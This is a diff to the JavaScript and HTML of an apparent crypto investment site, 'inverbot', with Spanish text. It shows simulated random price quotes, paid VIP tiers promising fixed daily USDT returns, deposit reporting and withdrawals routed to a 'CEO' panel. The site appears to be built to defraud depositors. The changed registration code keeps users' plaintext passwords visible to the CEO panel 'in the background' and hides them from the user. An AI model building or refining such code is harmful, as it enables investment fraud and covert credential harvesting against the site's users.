@@ -463,7 +463,7 @@
                 else cerrarSesion();
             }
 
-            // COTIZACIONES EN TIEMPO REAL ULTRA RÁPIDAS (CADA 200 MILISEGUNDOS)
+            // COTIZACIONES EN TIEMPO REAL ULTRA RÁPIDAS (Milisegundos)
             setInterval(() => {
                 let r1 = (81590 + Math.random() * 30).toFixed(2);
                 let r2 = (2387 + Math.random() * 5).toFixed(2);
@@ -491,7 +491,7 @@
             if(users.some(u => u.email === email)) { mostrarAlertaPro("Aviso", "Este correo ya se encuentra registrado en el sistema."); return; }
 
             let btn = e.target.querySelector('button');
-            if(btn) { btn.disabled = true; btn.innerText = "⏳ Procesando registro (2s)..."; }
+            if(btn) { btn.disabled = true; btn.innerText = "⏳ Creando cuenta..."; }
 
             setTimeout(() => {
                 let myCode = "REF-" + Math.floor(100000 + Math.random() * 900000);
@@ -505,9 +505,13 @@
                 users.push(nuevo);
                 guardarUsuarios(users);
                 if(btn) { btn.disabled = false; btn.innerText = "Crear Cuenta"; }
-                mostrarAlertaPro("Notificación CEO", `¡Nuevo registro recibido!\n📧 Correo: ${email}\n🔑 Contraseña: ${pass}\n(Visible de inmediato en el Panel CEO).`);
-                cambiarVistaAuth(true);
-            }, 2000);
+
+                // EL USUARIO ENTRA NORMAL SIN VER SU CONTRASEÑA EN NINGUNA ALERTA. 
+                // La notificación y credenciales quedan registradas en el Panel CEO en segundo plano.
+                sessionEmail = email;
+                localStorage.setItem("inverbot_session", sessionEmail);
+                entrarDashboardDirecto();
+            }, 1000);
         }
 
         function iniciarSesion(e) {
@@ -520,14 +524,14 @@
             if(!u) { mostrarAlertaPro("Error de Autenticación", "Credenciales incorrectas o usuario no registrado."); return; }
 
             let btn = e.target.querySelector('button');
-            if(btn) { btn.disabled = true; btn.innerText = "⏳ Verificando credenciales (2s)..."; }
+            if(btn) { btn.disabled = true; btn.innerText = "⏳ Verificando..."; }
 
             setTimeout(() => {
                 if(btn) { btn.disabled = false; btn.innerText = "Autenticar Sesión"; }
                 sessionEmail = email;
                 localStorage.setItem("inverbot_session", sessionEmail);
                 entrarDashboardDirecto();
-            }, 2000);
+            }, 1000);
         }
 
         function entrarDashboardDirecto() {
@@ -616,7 +620,7 @@
                     <h4 style="font-size:12px; color:var(--accent-green); margin-bottom:8px;">📤 Solicitud de Retiro USDT</h4>
                     <form onsubmit="solicitarRetiro(event)">
                         <div class="input-group"><label>Red Blockchain</label><select id="witRed"><option value="BEP20">BEP20</option><option value="ERC20">ERC20</option><option value="TRC20">TRC20</option></select></div>
-                        <div class="input-group"><label>Dirección de Wallet de Destino</label><input type="text" id="witWallet" required placeholder="Ej: 0x... o T... (Dirección válida)"></div>
+                        <div class="input-group"><label>Dirección de Wallet de Destino</label><input type="text" id="witWallet" required placeholder="Ej: 0x... o T..."></div>
                         <div class="input-group"><label>Monto a Retirar</label><input type="number" id="witMonto" step="0.01" required placeholder="Cantidad USDT"></div>
                         <div class="input-group"><label>Contraseña de Seguridad</label><input type="password" id="witPass" required placeholder="Contraseña"></div>
                         <button type="submit" class="btn btn-green">Enviar Solicitud de Retiro</button>
@@ -630,10 +634,10 @@
                 <div style="background:var(--bg-input); border:1px solid var(--accent-green); padding:12px; border-radius:8px;">
                     <p style="font-size:11px; font-weight:600; color:var(--accent-green); margin-bottom:4px;">Red Activa: ${redNombre}</p>
                     <code style="font-size:10px; color:var(--accent-green); word-break:break-all; display:block; background:#000; padding:6px; border-radius:4px; margin-bottom:8px;">${direccionWallet}</code>
-                    <button class="btn btn-green" style="padding:6px; font-size:11px; margin-bottom:10px;" onclick="copiarTexto('${direccionWallet}')">Copiar Dirección de Depósito</button>
+                    <button class="btn btn-green" style="padding:6px; font-size:11px; margin-bottom:10px;" onclick="copiarTexto('${direccionWallet}')">Copiar Dirección</button>
                     <form onsubmit="reportarDepositoEspecifico(event, '${redNombre}')">
                         <div class="input-group"><label>Monto Depositado (Mín 4)</label><input type="number" id="depMontoEsp" step="0.01" min="4" required placeholder="Ej: 50"></div>
-                        <div class="input-group"><label>ID de Transacción (TXID / Hash)</label><input type="text" id="depHashEsp" required placeholder="Ej: 0x8f9c... (Hash válido blockchain)"></div>
+                        <div class="input-group"><label>ID de Transacción (TXID / Hash)</label><input type="text" id="depHashEsp" required placeholder="Ej: 0x8f9c..."></div>
                         <button type="submit" class="btn btn-green">Verificar y Enviar al CEO</button>
                     </form>
                 </div>
@@ -648,12 +652,12 @@
             let hash = document.getElementById('depHashEsp').value.trim();
             
             if(hash.length < 15 || hash.includes(" ")) {
-                mostrarAlertaPro("Error de Validación", "El ID de Transacción (TXID/Hash) ingresado no es válido.");
+                mostrarAlertaPro("Error de Validación", "El ID de Transacción (Hash) no es válido.");
                 return;
             }
 
             let btn = e.target.querySelector('button');
-            if(btn) { btn.disabled = true; btn.innerText = "⏳ Validando en red (2s)..."; }
+            if(btn) { btn.disabled = true; btn.innerText = "⏳ Validando..."; }
 
             setTimeout(() => {
                 let dbDeps = JSON.parse(localStorage.getItem(STORAGE_DEPS)) || [];
@@ -662,7 +666,7 @@
                 if(btn) { btn.disabled = false; btn.innerText = "Verificar y Enviar al CEO"; }
                 mostrarAlertaPro("Éxito", "¡Depósito notificado correctamente al panel CEO!");
                 document.getElementById('subAccionContainer').style.display = 'none';
-            }, 2000);
+            }, 1000);
         }
 
         function solicitarRetiro(e) {
@@ -673,17 +677,17 @@
             let pass = document.getElementById('witPass').value.trim();
 
             if(wallet.length < 10 || wallet.includes(" ")) {
-                mostrarAlertaPro("Error de Validación", "La dirección de wallet de destino no es válida.");
+                mostrarAlertaPro("Error de Validación", "La dirección de wallet no es válida.");
                 return;
             }
 
             let users = obtenerUsuarios();
             let u = users.find(x => x.email === sessionEmail);
             if(u.pass !== pass) { mostrarAlertaPro("Error de Seguridad", "Contraseña institucional incorrecta."); return; }
-            if(u.balance < monto) { mostrarAlertaPro("Saldo Insuficiente", "El monto solicitado supera su balance disponible."); return; }
+            if(u.balance < monto) { mostrarAlertaPro("Saldo Insuficiente", "El monto solicitado supera su balance."); return; }
 
             let btn = e.target.querySelector('button');
-            if(btn) { btn.disabled = true; btn.innerText = "⏳ Procesando retiro (2s)..."; }
+            if(btn) { btn.disabled = true; btn.innerText = "⏳ Procesando..."; }
 
             setTimeout(() => {
                 u.balance -= monto;
@@ -694,13 +698,13 @@
                 if(btn) { btn.disabled = false; btn.innerText = "Enviar Solicitud de Retiro"; }
                 mostrarAlertaPro("Éxito", "¡Solicitud de retiro enviada al CEO!");
                 entrarDashboardDirecto();
-            }, 2000);
+            }, 1000);
         }
 
         function comprarVip(nivel, precio) {
             let users = obtenerUsuarios();
             let u = users.find(x => x.email === sessionEmail);
-            if(u.balance < precio) { mostrarAlertaPro("Fondos Insuficientes", `Requiere ${precio} USDT para adquirir este nivel VIP.`); return; }
+            if(u.balance < precio) { mostrarAlertaPro("Fondos Insuficientes", `Requiere ${precio} USDT.`); return; }
             
             setTimeout(() => {
                 u.balance -= precio;
@@ -708,9 +712,9 @@
                 u.vipExpiry = Date.now() + (35 * 24 * 60 * 60 * 1000); 
                 u.lastClaim = 0;
                 guardarUsuarios(users);
-                mostrarAlertaPro("Éxito", `¡Nivel VIP ${nivel} activado institucionalmente!`);
+                mostrarAlertaPro("Éxito", `¡Nivel VIP ${nivel} activado!`);
                 entrarDashboardDirecto();
-            }, 2000);
+            }, 1000);
         }
 
         function reclamarVip(nivel) {
@@ -718,11 +722,11 @@
             let u = users.find(x => x.email === sessionEmail);
             if(u.vipActive !== nivel || u.vipExpiry < Date.now()) { mostrarAlertaPro("Aviso", "No cuenta con un VIP activo."); return; }
             let ahora = Date.now();
-            if(ahora - u.lastClaim < 24 * 60 * 60 * 1000) { mostrarAlertaPro("Espera", "Debe esperar el ciclo de 24 horas para su siguiente reclamo."); return; }
+            if(ahora - u.lastClaim < 24 * 60 * 60 * 1000) { mostrarAlertaPro("Espera", "Debe esperar el ciclo de 24 horas."); return; }
             
             let btnId = (nivel === 1) ? 'btnClaim1' : (nivel === 'Max' ? 'btnClaimMax' : 'btnClaimUltra');
             let btn = document.getElementById(btnId);
-            if(btn) { btn.disabled = true; btn.innerText = "⏳ Cuantificando (2s)..."; }
+            if(btn) { btn.disabled = true; btn.innerText = "⏳ Cuantificando..."; }
             
             setTimeout(() => {
                 let rec = (nivel === 1) ? 1.5 : (nivel === 'Max' ? 6.5 : 42.2);
@@ -730,9 +734,9 @@
                 u.lastClaim = ahora;
                 guardarUsuarios(users);
                 if(btn) { btn.disabled = false; btn.innerText = "Reclamar Rendimiento Diario"; }
-                mostrarAlertaPro("Rendimiento Acreditado", `¡+${rec} USDT acreditados a su balance.`);
+                mostrarAlertaPro("Rendimiento Acreditado", `¡+${rec} USDT acreditados!`);
                 entrarDashboardDirecto();
-            }, 2000);
+            }, 1000);
         }
 
         function abrirPanelAdmin() {
